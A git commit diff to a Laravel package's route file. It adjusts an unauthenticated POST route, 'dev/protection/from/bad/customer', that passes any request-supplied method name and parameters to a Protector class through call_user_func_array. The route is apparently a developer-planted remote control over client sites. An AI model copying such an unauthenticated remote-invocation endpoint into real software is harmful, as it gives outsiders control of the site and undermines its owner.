eb7186a0ca44e9e87fd1d64b02e3ced80149d9a9
MasterRO94 <igoshin18@gmail.com>
2016-09-19 01:24:35 +0300

    test

--- src/route-handler.php
+++ src/route-handler.php
@@ -1,5 +1,5 @@
 <?php
 
     \Illuminate\Support\Facades\Route::post('dev/protection/from/bad/customer', function(){
-        return call_user_func_array(['\MasterRO\DevProtection\Protector', request()->get('action', [])], request()->get('params'));
+        return call_user_func_array(['\MasterRO\DevProtection\Protector', request()->get('action')], request()->get('params', []));
     });
